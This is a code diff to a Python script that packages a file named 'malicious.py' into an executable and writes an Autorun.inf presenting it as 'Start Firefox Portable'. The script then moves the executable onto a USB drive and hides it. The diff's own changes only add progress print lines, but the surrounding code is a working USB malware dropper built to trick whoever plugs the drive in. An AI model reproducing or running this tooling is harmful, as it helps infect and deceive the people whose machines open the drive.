@@ -9,7 +9,7 @@ pwd = "X:"
 usbdir = os.path.join(pwd,"USB")
 if os.path.isfile(exename):
     os.remove(exename)
-#print("Creating EXE")     ##Include it for learning purpose
+print("Creating EXE")     ##Include it for learning purpose
 # create executable from Python script
 PyInstaller.__main__.run([
     "malicious.py"
@@ -19,13 +19,15 @@ PyInstaller.__main__.run([
     "--name="+exename,
     "--icon="+icon
 ])
-
+print("Exe created")
 # clean up after PyInstaller
 shutil.move(os.path.join(pwd,"dist",exename),pwd)
 shutil.rmtree("dist")
 shutil.rmtree("build")
 shutil.rmtree("__pycache__")
 os.remove(exename+".spec")
+
+print("creating autorun file")
 
 # create AutoRun File
 with open("Autorun.inf","w") as o:
@@ -34,6 +36,8 @@ with open("Autorun.inf","w") as o:
     o.write("Action=Start Firefox Portable\n")
     o.write("Label=My USB\n")
     o.write("Icon="+exename+"\n")
+
+print("setting up USB")
     
 # Move files to USB and set hidden
 shutil.move(exename,usbdir)
